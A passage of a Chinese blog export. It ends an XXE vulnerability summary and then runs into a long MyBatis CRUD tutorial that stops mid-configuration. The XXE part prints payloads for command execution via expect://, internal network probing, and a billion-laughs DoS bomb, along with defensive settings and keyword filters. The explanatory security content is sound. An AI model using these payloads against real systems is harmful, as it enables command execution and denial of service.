src="https://img-blog.csdnimg.cn/20201212203240768.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">注意这种方式必须要先引用 参数实体，才能引用通用实体，且缺一不可。</p><h4 id="2、命令执行："><a href="#2、命令执行：" class="headerlink" title="2、命令执行："></a>2、命令执行：</h4><p>在安装 expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。<br>因为PHP的 expect 并不是默认安装扩展，所以命令执行比较难利用，但不排除有幸运的情况。</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;expect://cat /&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</code></pre><h4 id="3、内网探测："><a href="#3、内网探测：" class="headerlink" title="3、内网探测："></a>3、内网探测：</h4><p>XML 外部实体中是可以使用http://协议，可以利用该请求去探查内网。</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:80&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</code></pre><h4 id="4、攻击内网网站："><a href="#4、攻击内网网站：" class="headerlink" title="4、攻击内网网站："></a>4、攻击内网网站：</h4><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:80/payload&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</code></pre><h4 id="5、发起Dos攻击："><a href="#5、发起Dos攻击：" class="headerlink" title="5、发起Dos攻击："></a>5、发起Dos攻击：</h4><p>几乎所有可以控制服务器资源利用的东西，都可用于制造DOS攻击。通过XML外部实体注入，攻击者可以发送任意的HTTP请求，因为解析器会解析文档中的所有实体，所以如果实体声明层层嵌套的话，在一定数量上可以对服务器器造成DoS。</p><p>常见的XML炸弹：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE lolz [&lt;!ENTITY lol &quot;lol&quot;&gt;&lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;]&gt;&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</code></pre><p>攻击原理：XML解析器尝试解析该文件时，DTD中的实体会以指数级的数量级展开，lol 实体为 “lol” 字符串，然后一个 lol2 实体引用了 10 次 lol 实体，一个 lol3 实体引用了 10 次 lol2 实体，此时一个 lol3 实体就含有 <code>10^2</code> 个 “lol” 了，以此类推，lol9 实体含有 <code>10^8</code> 个 “lol” 字符串，所以这个1K不到的文件经过解析后会占用到3G的内存,可见有多恐怖，不过现代的服务器软硬件大多已经抵御了此类攻击。</p><p>防御XML炸弹的方法也很简单禁止DTD或者是限制每个实体的最大长度。</p><h3 id="五、XXE-如何防御："><a href="#五、XXE-如何防御：" class="headerlink" title="五、XXE 如何防御："></a>五、XXE 如何防御：</h3><h4 id="方式一、使用开发语言提供的禁用外部实体的方法："><a href="#方式一、使用开发语言提供的禁用外部实体的方法：" class="headerlink" title="方式一、使用开发语言提供的禁用外部实体的方法："></a>方式一、使用开发语言提供的禁用外部实体的方法：</h4><p>PHP：</p><pre><code class="php">libxml_disable_entity_loader(true);</code></pre><p>JAVA:</p><pre><code class="java">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);</code></pre><p>Python：</p><pre><code class="python">from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</code></pre><h4 id="方式二、过滤用户输入："><a href="#方式二、过滤用户输入：" class="headerlink" title="方式二、过滤用户输入："></a>方式二、过滤用户输入：</h4><p>过滤用户提交的XML数据 ，关键词：<code>&lt;!DOCTYPE&gt;、&lt;!ENTITY&gt;、SYSTEM、PUBLIC</code>。</p><h3 id="六、最后"><a href="#六、最后" class="headerlink" title="六、最后"></a>六、最后</h3><p>🆗，关于 XXE漏洞的总结大致就这些了，后面遇到新的 XXE利用方式再补上。( •̀ ω •́ )✧</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
          <category> XXE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xxe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mybatis框架学习</title>
      <link href="2021/01/20/Java%20EE%E2%80%94%E2%80%94Mybatis%20%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/"/>
      <url>2021/01/20/Java%20EE%E2%80%94%E2%80%94Mybatis%20%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h4 id="一、MyBatis-框架概述："><a href="#一、MyBatis-框架概述：" class="headerlink" title="一、MyBatis 框架概述："></a>一、MyBatis 框架概述：</h4><p><strong>1、什么是mybatis</strong>：</p><ul><li><p>mybatis 是一个优秀的基于 java 的持久层框架，它内部封装了 jdbc，使开发者只需要关注 sql 语句本身，而不需要花费精力去处理加载驱动、创建连接、创建 statement 等繁杂的过程。</p></li><li><p>mybatis 通过 xml 或注解的方式将要执行的各种 statement 配置起来，并通过 java 对象和 statement 中sql 的动态参数进行映射生成最终执行的 sql 语句，最后由 mybatis 框架执行 sql 并将结果映射为 java 对象并返回。</p></li><li><p>采用 ORM 思想解决了实体和数据库映射的问题，对 jdbc 进行了封装，屏蔽了 jdbc api 底层访问细节，使我们不用与 jdbc api 打交道，就可以完成对数据库的持久化操作。</p></li></ul><p><strong>2、mybatis在三层架构中的位置</strong></p><p><img src="http://img-blog.csdnimg.cn/20201009105844161.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h4 id="二、-Mybatis-框架入门"><a href="#二、-Mybatis-框架入门" class="headerlink" title="二、 Mybatis 框架入门"></a>二、 Mybatis 框架入门</h4><p><strong>1、基于XML的方式</strong>：</p><p>1、创建 maven 工程：<br><img src="http://img-blog.csdnimg.cn/20201011112115858.png" alt="在这里插入图片描述"><br>2、添加 Mybatis的坐标：</p><ul><li>在 pom.xml 文件中添加 Mybatis3.4.5 的坐标，如下：</li></ul><pre><code class="xml">&lt;dependencies&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.mybatis&lt;/groupId&gt;            &lt;artifactId&gt;mybatis&lt;/artifactId&gt;            &lt;version&gt;3.4.5&lt;/version&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;mysql&lt;/groupId&gt;            &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;            &lt;version&gt;5.1.6&lt;/version&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;log4j&lt;/groupId&gt;            &lt;artifactId&gt;log4j&lt;/artifactId&gt;            &lt;version&gt;1.2.12&lt;/version&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;junit&lt;/groupId&gt;            &lt;artifactId&gt;junit&lt;/artifactId&gt;            &lt;version&gt;4.10&lt;/version&gt;        &lt;/dependency&gt;    &lt;/dependencies&gt;</code></pre><p>3、编写 User 实体类：</p><pre><code class="java">public class User implements Serializable &#123;    private Integer id;    private String username;    private Date birthday;    private String address;    public Integer getId() &#123;        return id;    &#125;    public void setId(Integer id) &#123;        this.id = id;    &#125;    public String getUsername() &#123;        return username;    &#125;    public void setUsername(String username) &#123;        this.username = username;    &#125;    public Date getBirthday() &#123;        return birthday;    &#125;    public void setBirthday(Date birthday) &#123;        this.birthday = birthday;    &#125;    public String getAddress() &#123;        return address;    &#125;    public void setAddress(String address) &#123;        this.address = address;    &#125;    @Override    public String toString() &#123;        return &quot;User&#123;&quot; +                &quot;id=&quot; + id +                &quot;, username=&#39;&quot; + username + &#39;\&#39;&#39; +                &quot;, birthday=&quot; + birthday +                &quot;, address=&#39;&quot; + address + &#39;\&#39;&#39; +                &#39;&#125;&#39;;    &#125;&#125;</code></pre><p>4、编写持久层接口 IUserDao：</p><pre><code class="java">public interface IUserDao &#123;    /*     *查询所有操作     * */    List&lt;User&gt; findAll();&#125;</code></pre><p>5、编写持久层接口的映射文件 IUserDao.xml：</p><p>注意：</p><ul><li>创建位置：必须和持久层接口在相同的包中。</li><li>名称：必须以持久层接口名称命名文件名，扩展名是.xml</li></ul><p>例：都是在com.smk.dao包中<br><img src="http://img-blog.csdnimg.cn/2020101111305136.png" alt="在这里插入图片描述"></p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE mapper        PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;        &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;mapper namespace=&quot;com.smk.dao.IUserDao&quot;&gt;    &lt;select id=&quot;findAll&quot; resultType=&quot;com.smk.domain.User&quot;&gt;        select * from user    &lt;/select&gt;&lt;/mapper&gt;</code></pre><p>不要忘记在映射配置中告知mybatis要封装到哪个实体类中。</p><p>配置的方式：指定实体类的全限定类名 即：<code>resultType=&quot;com.smk.domain.User&quot;</code></p><p>6、 编写 SqlMapConfig.xml 配置文件：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE configuration        PUBLIC &quot;-//mybatis.org//DTD Config 3.0//EN&quot;        &quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;&gt;&lt;!--mybatis的主配置文件--&gt;&lt;configuration&gt;    &lt;!-- 配置环境--&gt;    &lt;environments default=&quot;mysql&quot;&gt;        &lt;!-- 配置mysql环境--&gt;        &lt;environment id=&quot;mysql&quot;&gt;            &lt;!--配置事物的类型--&gt;            &lt;transactionManager type=&quot;JDBC&quot;&gt;&lt;/transactionManager&gt;            &lt;!--配置数据源/连接池2--&gt;            &lt;dataSource type=&quot;POOLED&quot;&gt;                &lt;property name=&quot;driver&quot; value=&quot;com.mysql.jdbc.Driver&quot;/&gt;                &lt;property name=&quot;url&quot; value=&quot;jdbc:mysql://localhost:3306/my_batis?useUnicode=true&amp;amp;characterEncoding=utf8&quot;/&gt;                &lt;property name=&quot;username&quot; value=&quot;root&quot;/&gt;                &lt;property name=&quot;password&quot; value=&quot;&quot;/&gt;            &lt;/dataSource&gt;        &lt;/environment&gt;    &lt;/environments&gt;    &lt;!--指定映射配置文件的位置，映射配置文件指的是每个dao独立的配置文件--&gt;    &lt;mappers&gt;        &lt;mapper resource=&quot;com/smk/dao/IUserDao.xml&quot;&gt;&lt;/mapper&gt;    &lt;/mappers&gt;&lt;/configuration&gt;</code></pre><p>7、编写测试类：</p><pre><code class="java">public class mybatis &#123;    public static void main(String[] args) throws IOException &#123;        //1.读取配置文件        InputStream in = Resources.getResourceAsStream(&quot;SqlMapConfig.xml&quot;);        //2.创建一个SqlsessionFactory工厂        SqlSessionFactoryBuilder builder = new SqlSessionFactoryBuilder();        SqlSessionFactory factory = builder.build(in);        //3.使用工厂生产一个Sqlsession对象        SqlSession session = factory.openSession();        //4.使用SqlSession创建Dao接口对象        IUserDao userDao = session.getMapper(IUserDao.class);        //5.使用代理对象执行方法        List&lt;User&gt; users = userDao.findAll();        for (User user : users) &#123;            System.out.println(user);        &#125;        //6.释放资源        session.close();        in.close();    &#125;&#125;</code></pre><p>在测试类中运行：</p><p><img src="http://img-blog.csdnimg.cn/20201011114342875.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><hr><p><strong>2、基于注解的方式</strong>：</p><p>在基于注解的的方式下就不再需要 IUserDao.xml配置文件，同时需要在SqlMapConfig.xml中的mapper配置时，使用class属性指定dao接口的全限定类名。</p><p>1、在持久层接口中添加注解：</p><pre><code class="java">public interface IUserDao &#123;    /*     *查询所有操作     * */    @Select(&quot;select * from user&quot;)    List&lt;User&gt; findAll();&#125;</code></pre><p>2、修改 SqlMapConfig.xml：</p><pre><code class="xml">&lt;mappers&gt;        &lt;mapper class=&quot;com.smk.dao.IUserDao&quot;&gt;&lt;/mapper&gt;&lt;/mappers&gt;</code></pre><blockquote><p>注意：在使用基于注解的 Mybatis 配置时，须移除 xml 的映射配置（IUserDao.xml）。</p></blockquote><p>运行结果：</p><p><img src="http://img-blog.csdnimg.cn/20201011123940792.png#pic_center" alt="在这里插入图片描述"></p><p>补充：</p><ul><li>不管使用XML还是注解配置， Mybatis是支持写dao实现类的。</li><li>但在在实际开发中，都是越简便越好，所以都是采用不写dao实现类的方式。</li></ul><h4 id="三、-基于代理-Dao-实现-CRUD-操作"><a href="#三、-基于代理-Dao-实现-CRUD-操作" class="headerlink" title="三、 基于代理 Dao 实现 CRUD 操作"></a>三、 基于代理 Dao 实现 CRUD 操作</h4><h5 id="1、根据-ID-查询："><a href="#1、根据-ID-查询：" class="headerlink" title="1、根据 ID 查询："></a>1、根据 ID 查询：</h5><p>步骤：</p><p>1、在持久层接口中添加 findById 方法：</p><pre><code class="java">public interface IUserDao &#123;    //根据 id 查询    User findById (Integer userId);&#125;</code></pre><p>2、配置映射文件：</p><pre><code class="java">&lt;mapper namespace=&quot;com.smk.dao.IUserDao&quot;&gt;    &lt;select id=&quot;findById&quot; resultType=&quot;com.smk.domain.User&quot; parameterType=&quot;int&quot;&gt;        select * from user where id= #&#123;id&#125;    &lt;/select&gt;&lt;/mapper&gt;</code></pre><p><strong>解释</strong>：</p><ul><li>resultType 属性：用于指定结果集的类型。</li><li>parameterType 属性：用于指定传入参数的类型。</li><li>sql 语句中使用<code>#&#123;&#125;</code>字符：它代表占位符，相当于原来 jdbc 部分所学的，都是用于执行语句时替换实际的数据。具体的数据是由<code>#&#123;&#125;</code>里面的内容决定的。</li><li><code>#&#123;&#125;</code>中内容的写法：由于数据类型是基本类型，所以此处可以随意写。</li></ul><p>3、 在测试类添加测试：</p><pre><code class="java">public class mybatis &#123;    private InputStream in;    private SqlSessionFactory factory;    private SqlSession session;    private IUserDao userDao;    @Test    public void testFindOne() &#123;        //6.执行操作        User user = userDao.findById(41);        System.out.println(user);    &#125;    @Before//在测试方法执行之前执行    public void init() throws Exception &#123;        //1.读取配置文件        in = Resources.getResourceAsStream(&quot;SqlMapConfig.xml&quot;);        //2.创建构建者对象        SqlSessionFactoryBuilder builder = new SqlSessionFactoryBuilder();        //3.创建 SqlSession 工厂对象        factory = builder.build(in);        //4.创建 SqlSession 对象        session = factory.openSession();        //5.创建 Dao 的代理对象        userDao = session.getMapper(IUserDao.class);    &#125;    @After//在测试方法执行完成之后执行    public void destroy() throws Exception &#123;        session.commit();//提交事务；在增删改时需要提交，查询时不需要。        //7.释放资源        session.close();        in.close();    &#125;&#125;</code></pre><p>运行结果：</p><p><img src="http://img-blog.csdnimg.cn/20201011203422131.png#pic_center" alt="在这里插入图片描述"></p><h5 id="2、保存操作："><a href="#2、保存操作：" class="headerlink" title="2、保存操作："></a>2、保存操作：</h5><p>同样的套路</p><p><strong>1、在持久层接口中添加新增方法</strong>：</p><pre><code class="java">  // 保存用户  int saveUser(User user);</code></pre><p><strong>2、配置映射文件</strong>：</p><pre><code class="java">&lt;insert id=&quot;saveUser&quot; parameterType=&quot;com.smk.domain.User&quot;&gt;        insert into user(username,birthday,sex,address) value (#&#123;username&#125;,#&#123;birthday&#125;,#&#123;sex&#125;,#&#123;address&#125;)&lt;/insert&gt;</code></pre><p>解释：</p><p> <code>#&#123;&#125;</code>中内容的写法：</p><ul><li>由于保存方法的参数是 一个 User 对象，此处要写 User 对象中的属性名称。<br>它用的是 ognl 表达式。</li></ul><p>ognl 表达式：</p><ul><li><p>它是 apache 提供的一种表达式语言，全称是：Object Graphic Navigation Language 对象图导航语言，它是按照一定的语法格式来获取数据的。语法格式就是使用 <code>#&#123;对象.对象&#125;</code> 的方式。</p></li><li><p><code>#&#123;user.username&#125;</code> 它会先去找 user 对象，然后在 user 对象中找到 username 属性，并调用 getUsername() 方法把值取出来。但是我们在 parameterType 属性上指定了实体类名称，所以可以省略 user 而直接写 username。</p></li></ul><p><strong>3、测试</strong>：</p><pre><code class="java"> @Test    public void testSave() &#123;        User user = new User();        user.setUsername(&quot;modify User property&quot;);        user.setAddress(&quot;北京市顺义区&quot;);        user.setSex(&quot;男&quot;);        user.setBirthday(new Date());        System.out.println(&quot;保存操作之前：&quot; + user);        //5.执行保存方法        userDao.saveUser(user);        System.out.println(&quot;保存操作之后：&quot; + user);    &#125;</code></pre><p><strong>注意</strong>：</p><p>在实现 <strong>增删改</strong> 时需要进行控制事务的提交。</p><p>如何在mybatis 中如何控制事务提交？</p><ul><li>可以使用：<code>session.commit();</code> 来实现事务提交。加入事务提交后的代码如下：</li></ul><pre><code class="java">@After//在测试方法执行完成之后执行public void destroy() throws Exception&#123;    session.commit();    //7.释放资源    session.close();    in.close();&#125;</code></pre><p>运行结果：</p><p><img src="http://img-blog.csdnimg.cn/20201011224511758.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20201011224811344.png" alt="在这里插入图片描述"><br><strong>问题扩展：获取新增用户 id 的返回值</strong>：</p><p>新增用户后，同时还要返回当前新增用户的 id 值，因为 id 是由数据库的自动增长来实现的，所以就相当于我们要在新增后将自动增长 auto_increment 的值返回。</p><pre><code class="java">    &lt;insert id=&quot;saveUser&quot; parameterType=&quot;com.smk.domain.User&quot;&gt;        &lt;!-- 配置保存时获取插入的id   keypreperty：代表要返回的值对应实体类里的字段 ，keyColumn代表数据库的字段名--&gt;        &lt;selectKey keyProperty=&quot;id&quot; keyColumn=&quot;id&quot; resultType=&quot;int&quot;&gt;            select last_insert_id();        &lt;/selectKey&gt;        insert into user(username,birthday,sex,address) value (#&#123;username&#125;,#&#123;birthday&#125;,#&#123;sex&#125;,#&#123;address&#125;)    &lt;/insert&gt;</code></pre><p>再次执行测试：</p><p><img src="http://img-blog.csdnimg.cn/20201012210239364.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>可以看到 id 的值已经获取到了。</p><h5 id="3、用户更新："><a href="#3、用户更新：" class="headerlink" title="3、用户更新："></a>3、用户更新：</h5><p>1、在持久层接口中添加更新方法：</p><pre><code class="java"> //更新用户    int updateUser(User user);</code></pre><p>2、配置映射文件：</p><pre><code class="java">    &lt;update id=&quot;updateUser&quot; parameterType=&quot;com.smk.domain.User&quot;&gt;        update user set username=#&#123;username&#125;,birthday=#&#123;birthday&#125;,sex=#&#123;sex&#125;, address=#&#123;address&#125; where id=#&#123;id&#125;    &lt;/update&gt;</code></pre><p>3、更新的测试方法：</p><pre><code class="java"> @Test    public void testUpdateUser() throws Exception &#123;        //1.根据 id 查询        User user = userDao.findById(52);        //2.更新操作        user.setAddress(&quot;北京市顺义区&quot;);        int res = userDao.updateUser(user);        System.out.println(res);    &#125;</code></pre><p>运行结果：</p><p><img src="http://img-blog.csdnimg.cn/20201011232354868.png#pic_center" alt="在这里插入图片描述"></p><h5 id="4、-用户删除："><a href="#4、-用户删除：" class="headerlink" title="4、 用户删除："></a>4、 用户删除：</h5><p>1、在持久层接口中添加删除方法：</p><pre><code class="java"> //删除用户    int deleteUser(int uid);</code></pre><p>2、配置映射文件：</p><pre><code class="java">&lt;delete id=&quot;deleteUser&quot; parameterType=&quot;int&quot;&gt;        delete from user where id=#&#123;uid&#125;&lt;/delete&gt;</code></pre><p>3、删除的测试方法：</p><pre><code class="java">@Test    public void testdeleteUser()&#123;        int res = userDao.deleteUser(52);        System.out.println(res);    &#125;</code></pre><p>至此基于mybatis的增删改查就完成了。<hr></p><h4 id="四、Mybatis-的参数深入"><a href="#四、Mybatis-的参数深入" class="headerlink" title="四、Mybatis 的参数深入"></a>四、Mybatis 的参数深入</h4><p>注：Mybatis使用ognl表达式解析对象字段的值，<code>#&#123;&#125;</code>或<code>$&#123;&#125;</code>括号中的值为pojo属性名称。</p><p><strong>什么是ognl</strong>：</p><p>Object Graphic Navigation Language<br>&nbsp;&nbsp;对象    &nbsp;&nbsp;&nbsp;&nbsp;图&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;导航    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;语言</p><p>它是通过对象的取值方法来获取数据。在写法上把get给省略了。</p><p> 比如：我们获取用户的名称</p><ul><li> 类中的写法：user.getUsername()</li><li>OGNL表达式写法：user.username</li></ul><p>mybatis中为什么能直接写username，而不用<code>user.</code>呢？</p><ul><li>因为在parameterType中已经提供了属性所属的类，所以此时不需要写对象名。<hr></li></ul><p> <strong>1、parameterType 配置参数</strong>：</p><p> SQL 语句的传参是通过使用标签的 parameterType 属性来设定。该属性的取值可以是基本类型，引用类型（例如:String 类型），还可以是实体类类型（POJO 类）。同时也可以使用实体类的包装类。</p><p><strong>2、传递 pojo 包装对象</strong>：</p><p>开发中通过 pojo 传递查询条件 。当查询条件是综合的查询条件：不仅包括用户查询条件还包括其它的查询条件（比如将用户购买商品信息也作为查询条件），这时可以使用包装对象传递输入参数。即：<font color = red> Pojo 类中包含 pojo</font> 。</p><p>例：</p><p>需求：根据用户名查询用户信息，查询条件放到 QueryVo 的 user 属性中。</p><p>1、编写 QueryVo：</p><pre><code class="java">public class QueryVo &#123;    private User user;    public User getUser() &#123;        return user;    &#125;    public void setUser(User user) &#123;        this.user = user;    &#125;&#125;</code></pre><p>2、编写持久层接口：</p><pre><code class="java">    //根据 QueryVo 中的条件查询用户    List&lt;User&gt; findByVo(QueryVo vo);</code></pre><p>3、配置映射文件：</p><pre><code class="java">    &lt;!-- 根据用户名称模糊查询，参数变成一个 QueryVo 对象了 --&gt;    &lt;select id=&quot;findByVo&quot; resultType=&quot;com.smk.domain.User&quot; parameterType=&quot;com.smk.domain.QueryVo&quot;&gt;        select * from user where username like #&#123;user.username&#125;;    &lt;/select&gt;</code></pre><p>4、添加测试类：</p><pre><code class="java">    @Test    public void testFindByQueryVo() &#123;        QueryVo vo = new QueryVo();        User user = new User();        user.setUsername(&quot;%王%&quot;);        vo.setUser(user);        List&lt;User&gt; users = userDao.findByVo(vo);        for (User u : users) &#123;            System.out.println(u);        &#125;    &#125;</code></pre><p>运行结果：</p><p><img src="http://img-blog.csdnimg.cn/20201014223858731.png#pic_center" alt="在这里插入图片描述"></p><h4 id="五、Mybatis的输出结果封装"><a href="#五、Mybatis的输出结果封装" class="headerlink" title="五、Mybatis的输出结果封装"></a>五、Mybatis的输出结果封装</h4><h5 id="1、resultType的配置结果类型："><a href="#1、resultType的配置结果类型：" class="headerlink" title="1、resultType的配置结果类型："></a>1、resultType的配置结果类型：</h5><p> resultType 属性可以指定结果集的类型，它支持基本数据类型和实体类数据类型。</p><p> 它和 parameterType 一样，如果注册过类型别名的，可以直接使用别名。</p><p> 没有注册过的必须使用全限定类名。</p><p>例如：我们的实体类此时必须是全限定类名，同时，当是实体类名称时，实体类中的属性名称必须和查询语句中的列名（即数据库里的表名列名）保持一致，否则无法实现封装。</p><p><strong>特殊情况示例</strong>：</p><p>当实体类属性和数据库表的列名已经不一致时</p><p>1、实体类代码：</p><pre><code class="java">public class User2 &#123;    public class User implements Serializable &#123;        private Integer userId;        private String userName;        private Date userBirthday;        private String userSex;        private String userAddress;        public Integer getUserId() &#123;            return userId;        &#125;        public void setUserId(Integer userId) &#123;            this.userId = userId;        &#125;        public String getUserName() &#123;            return userName;        &#125;        public void setUserName(String userName) &#123;            this.userName = userName;        &#125;        public Date getUserBirthday() &#123;            return userBirthday;        &#125;        public void setUserBirthday(Date userBirthday) &#123;            this.userBirthday = userBirthday;        &#125;        public String getUserSex() &#123;            return userSex;        &#125;        public void setUserSex(String userSex) &#123;            this.userSex = userSex;        &#125;        public String getUserAddress() &#123;            return userAddress;        &#125;        public void setUserAddress(String userAddress) &#123;            this.userAddress = userAddress;        &#125;        @Override        public String toString() &#123;            return &quot;User [userId=&quot; + userId + &quot;, userName=&quot; + userName + &quot;, userBirthday=&quot;                    + userBirthday + &quot;, userSex=&quot;                    + userSex + &quot;, userAddress=&quot; + userAddress + &quot;]&quot;;        &#125;    &#125;&#125;</code></pre><p>2、映射配置：</p><pre><code class="java">   // 查询所有用户    List&lt;User&gt; findAll();</code></pre><p>3、测试查询结果：</p><pre><code class="java">    @Test    public void testFindAll() &#123;        List&lt;User2&gt; users = userDao.findAll();        for (User2 user : users) &#123;            System.out.println(user);        &#125;    &#125;</code></pre><p>运行结果：</p><p><img src="http://img-blog.csdnimg.cn/20201106204232953.png#pic_center" alt="在这里插入图片描述"><br>为什么名称会有值呢？</p><p>因为：mysql 在 windows 系统中不区分大小写！</p><p><strong>应对措施</strong>：</p><ol><li>使用别名查询：</li><li>使用resultMap 结果类型封装</li></ol><p><strong>1、使用别名查询</strong>：</p><p>即给实体类的属性名起对应数据的字段值别名</p><p><img src="http://img-blog.csdnimg.cn/20201107113557449.png#pic_center" alt="在这里插入图片描述"></p><p><strong>2、resultMap 结果类型</strong>：</p><p>resultMap 标签可以建立查询的列名和实体类的属性名称不一致时建立对应关系。从而实现封装。</p><p>在 select 标签中使用 resultMap 属性指定引用即可。同时 resultMap 可以实现将查询结果映射为复杂类型的 pojo，比如在查询结果映射对象中包括 pojo 和 list 实现一对一查询和一对多查询。</p><p><strong>实现步骤</strong>：</p><p> 1、定义 resultMap：</p><pre><code class="xml"> &lt;!-- 建立 Use实体和数据库表的对应关系    type属性：指定实体类的全限定类名    id 属性：给定一个唯一标识，是给查询 select 标签引用用的    --&gt;    &lt;resultMap type=&quot;com.smk.domain.User2&quot; id=&quot;userMap&quot;&gt;        &lt;id column=&quot;id&quot; property=&quot;userId&quot;/&gt;        &lt;result column=&quot;username&quot; property=&quot;userName&quot;/&gt;        &lt;result column=&quot;sex&quot; property=&quot;userSex&quot;/&gt;        &lt;result column=&quot;address&quot; property=&quot;userAddress&quot;/&gt;        &lt;result column=&quot;birthday&quot; property=&quot;userBirthday&quot;/&gt;    &lt;/resultMap&gt;</code></pre><ul><li><p>id 标签：用于指定主键字段</p></li><li><p>result 标签：用于指定非主键字段</p></li><li><p>column 属性：用于指定数据库列名</p></li><li><p>property 属性：用于指定实体类属性名称</p><p>2、映射配置：</p></li></ul><pre><code class="java">    &lt;!-- 配置查询所有操作 --&gt;    &lt;select id=&quot;findAll&quot; resultMap=&quot;userMap&quot;&gt;       select * from user    &lt;/select&gt;</code></pre><p>3、测试结果：</p><p><img src="http://img-blog.csdnimg.cn/20201106210506605.png#pic_center" alt="在这里插入图片描述"><br>可以看到查询正常了。</p><h4 id="六、SqlMapConfig-xml配置文件"><a href="#六、SqlMapConfig-xml配置文件" class="headerlink" title="六、SqlMapConfig.xml配置文件"></a>六、SqlMapConfig.xml配置文件</h4><p><strong>1、properties（属性）</strong>：</p><p>在使用 properties 标签配置时，我们可以采用两种方式指定属性配置。</p><p>1、第一种  ：</p><pre><code class="xml">    &lt;properties&gt;        &lt;property name=&quot;jdbc.driver&quot; 